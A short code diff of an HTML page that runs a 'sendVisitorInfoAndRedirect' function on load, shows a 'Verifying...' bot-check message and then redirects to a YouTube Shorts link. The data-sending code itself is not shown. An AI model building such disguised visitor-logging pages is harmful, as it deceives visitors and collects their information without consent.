@@ -531,30 +531,28 @@ try {
 window.location.replace("https://www.youtube.com/shorts/QI6B04Ss5LE");
 }
 
-// Start the process of sending info and redirecting
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f4f4;
-            color: #333;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        p {
-            font-size: 18px;
-            text-align: center;
-        }
-    </style>
-    <script>
-        // Start the process of sending info and redirecting
-        sendVisitorInfoAndRedirect();
-    </script>
+    // Run the function when the page loads
+    window.onload = sendVisitorInfoAndRedirect;
+  </script>
+  <style>
+    body {
+      background-color: #0c0c0c; /* Dark background color */
+      color: #d3d3d3; /* Light text color */
+      font-family: 'Roboto', sans-serif; /* Smooth, readable font */
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    h1 {
+      color: #d3d3d3; /* Light color for headings */
+      font-size: 2rem; /* Adjust as needed */
+      margin-top: 20vh; /* Center vertically */
+    }
+  </style>
+  <!-- Google Fonts link -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
 </head>
 <body>
-    <p>Verifying if the user is a bot...</p>
+  <h1>Verifying...</h1>
 </body>
 </html>
